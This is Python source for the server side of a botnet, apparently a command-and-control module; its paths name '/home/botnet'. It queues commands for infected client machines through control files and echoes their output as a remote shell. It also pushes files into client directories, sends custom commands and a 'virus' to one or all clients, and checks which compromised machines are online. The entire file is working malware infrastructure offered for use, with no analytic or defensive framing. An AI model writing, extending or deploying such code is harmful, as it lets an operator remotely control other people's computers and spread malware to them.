import os
import shutil
import threading
import time

class Server:
    def __init__(self):
        self.client_control = "client_control/"
        self.client_output = "client_output/"
        self.sendfile_output = "sendfile/output/"
        self.online = "online/"
        self.custom_cmd_output = "custom_cmd/output/"
        self.vir_output = "vir/output/"
        self.printing_client_output = False

    def clear_cmd(self, client):
        open(self.client_control + client, "w").close()

    def send_cmd(self, client, cmd):
        with open(self.client_control + client, "w") as f:
            f.write(cmd)

    def get_clients_cmd(self):
        clients = []
        for _, _, file in os.walk(self.client_control):
            clients.extend(file)
        return clients
    
    def get_client_cmd(self, client_num):
        client = 0
        for x in self.get_clients_cmd():
            if x.split("-")[-1].split(".")[0] == client_num:
                client = x
                break
        return client
    
    def get_clients_output(self):
        clients = []
        for _, _, file in os.walk(self.client_output):
            clients.extend(file)
        return clients
    
    def get_client_output(self, client_num):
        client = 0
        for x in self.get_clients_output():
            if x.split("-")[-1].split(".")[0] == client_num:
                client = x
                break
        
        with open(self.client_output + client, "r") as f:
            client_output = f.read()

        return client_output

    def get_client_info(self, client):
        with open(f"/home/botnet/client/clients/{client}.txt", "r") as f:
            return f.read()

    def print_output(self, client_num, machine_name):
        printing = False
        check = True
        temp = self.get_client_output(client_num).strip()

        print(end="")
        while self.printing_client_output:
            output = self.get_client_output(client_num).strip()
            if len(output) > 1 and check:
                printing = True
            if len(output) > 1 and printing and temp != output:
                print(f"\n{output}\nClient-Machine/{machine_name} $ ", end="")
                printing = False
                check = False
                temp = output
            if len(output) < 1:
                check = True
            
    def start_output_thread(self, client_num, machine_name):
        threading.Thread(target=self.print_output, args=(client_num, machine_name,)).start()
        self.printing_client_output = True
    
    def stop_output_thread(self):
        self.printing_client_output = False
    
    def wait_for_sendfile_output(self, client):
        while True:
            try:
                with open(self.sendfile_output + client, "r") as f:
                    contents = f.read().strip()
                    if contents.startswith("Success") or contents.startswith("Failed"):
                        print(contents)
                        break
            except:
                pass

    def wait_for_sendfile_all_output(self):
        x = 0
        clients = []

        for _, _, file in os.walk("client_control/"):
            clients.extend(file)

        while True:
            if x == 10 or clients == []:
                break

            for i, v in enumerate(clients):
                try:
                    with open(self.sendfile_output + v, "r") as f:
                        contents = f.read().strip()
                        if contents.startswith("Success") or contents.startswith("Failed"):
                            print(contents)
                            clients.pop(i)
                except:
                    pass
            x += 1
            time.sleep(1)
        
        if clients != []:
            for x in clients:
                client_name = x.split(".")[0]
                print(f"Failed to respond: {client_name}")

    def get_clients_online(self):
        clients = []
        clients_time_online = []

        for _, _, files in os.walk(self.online):
            clients.extend(files)
        for x in clients:
            with open(self.online + x, "r") as f:
                clients_time_online.append(f.read().replace("\x00", ""))

        return clients, clients_time_online

    def check_online_clients(self):
        clients, clients_time_online = self.get_clients_online()
        x = 0

        for _ in range(10):
            for i, v in enumerate(clients):
                _, time_online = self.get_clients_online()
                if time_online[i+x] != clients_time_online[i]:
                    client_name = v.split(".")[0]
                    client_num = client_name.split("-")[2]
                    print(f"{client_name} (Client {client_num}): ONLINE")
                    clients.pop(i)
                    time_online.pop(i)
                    clients_time_online.pop(i)
                    x += 1
                    continue
            time.sleep(1)
        
        if len(clients) > 0:
            for i, v in enumerate(clients):
                client_name = v.split(".")[0]
                client_num = client_name.split("-")[2]
                print(f"{client_name} (Client {client_num}): OFFLINE")
        else:
            print("All clients are ONLINE")

        print()

    def sendfile(self, client, file, client_dir):
        with open("sendfile/file_info.txt", "w") as f:
            f.write(f"{client}\n{client_dir}")
        shutil.copy(file, "sendfile/")
    
    def remove_client(self, client):
        client_nums = "/home/botnet/client/clients_num.txt"
        dirs = [
            self.client_control,
            "/home/botnet/client/clients/",
            self.online,
            self.client_output,
            self.sendfile_output,
            self.vir_output,
            self.custom_cmd_output
        ]

        for x in dirs:
            try:
                os.remove(x + client)
            except:
                pass
        
        with open(client_nums, "r+") as f:
            contents = f.read().strip().replace("\x00", "")
        os.remove(client_nums)
        with open(client_nums, "w") as f:
            f.write(str(int(contents) - 1))
    
    def remove_all_clients(self):
        for x in self.get_clients_cmd():
            self.remove_client(x)
    
    def send_custom_cmd(self, client, cmd):
        with open("custom_cmd/cmd_info.txt", "w") as f:
            f.write(f"{client}\n{cmd}")
    
    def wait_custom_cmd_output(self, client):
        while True:
            try:
                with open(self.custom_cmd_output + client, "r") as f:
                    contents = f.read().strip()
                    if contents.startswith("Success") or contents.startswith("Failed"):
                        print(contents)
                        break
            except:
                pass

    def wait_custom_cmd_all_output(self):
        x = 0
        clients = []

        for _, _, file in os.walk("client_control/"):
            clients.extend(file)

        while True:
            if x == 10 or clients == []:
                break

            for i, v in enumerate(clients):
                try:
                    with open(self.custom_cmd_output + v, "r") as f:
                        contents = f.read().strip()
                        if contents.startswith("Success") or contents.startswith("Failed"):
                            print(contents)
                            clients.pop(i)
                except:
                    pass
            x += 1
            time.sleep(1)
        
        if clients != []:
            for x in clients:
                client_name = x.split(".")[0]
                print(f"Failed to respond: {client_name}")

    def send_virus(self, client, cmd):
        with open("vir/vir_info.txt", "w") as f:
            f.write(f"{client}\n{cmd}")
    
    def wait_virus_output(self, client):
        while True:
            try:
                with open(self.vir_output + client, "r") as f:
                    contents = f.read().strip()
                    if contents.startswith("Success") or contents.startswith("Failed"):
                        print(contents)
                        break
            except:
                pass

    def wait_virus_all_output(self):
        x = 0
        clients = []

        for _, _, file in os.walk("client_control/"):
            clients.extend(file)

        while True:
            if x == 10 or clients == []:
                break

            for i, v in enumerate(clients):
                try:
                    with open(self.vir_output + v, "r") as f:
                        contents = f.read().strip()
                        if contents.startswith("Success") or contents.startswith("Failed"):
                            print(contents)
                            clients.pop(i)
                except:
                    pass
            x += 1
            time.sleep(1)
        
        if clients != []:
            for x in clients:
                client_name = x.split(".")[0]
                print(f"Failed to respond: {client_name}")